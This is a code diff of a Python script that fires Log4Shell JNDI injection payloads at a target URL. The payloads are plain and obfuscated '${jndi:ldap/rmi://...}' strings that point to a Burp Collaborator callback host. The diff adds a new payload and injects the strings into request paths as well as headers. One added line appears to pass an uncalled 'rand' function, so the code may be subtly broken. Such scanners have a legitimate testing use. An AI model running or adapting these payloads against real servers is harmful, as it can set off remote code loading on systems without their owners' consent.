@@ -9,7 +9,7 @@ requests.packages.urllib3.disable_warnings()
 #needle.LOGGER = 0
 
 SERVER = "y76zcg4dlytcgrgsjgfnbc03lurkf9.burpcollaborator.net"
-payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s.%s.%s.%s/%s}",
+payloads = ["${jndi:ldap://%s.%s.%s.%s/%s}","${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s.%s.%s.%s/%s}",
                        "${${::-j}ndi:rmi://%s.%s.%s.%s/%s}",
                        "${jndi:rmi://%s.%s.%s.%s/%s}",
                        "${${lower:jndi}:${lower:rmi}://%s.%s.%s.%s/%s}",
@@ -37,9 +37,13 @@ def generate_header(payload,number,server,rand,target):
 
 def start(url):
     host = url.split("/")[2]
+    if host.count(":"):
+        host = url.split("/")[2].split(":")[0]
+    print(host)
     for p in range(len(payloads)):
         headers = generate_header(payloads[p],p,SERVER,rand(),host)
-        requests.get(url,verify=False,headers=headers,timeout=10)
+
+        requests.get(url+"/"+payloads[p] % (p,"path",host,SERVER,rand),verify=False,headers=headers,timeout=10)
     print("[•] Payloads sent to %s" % url)
 
 def main():
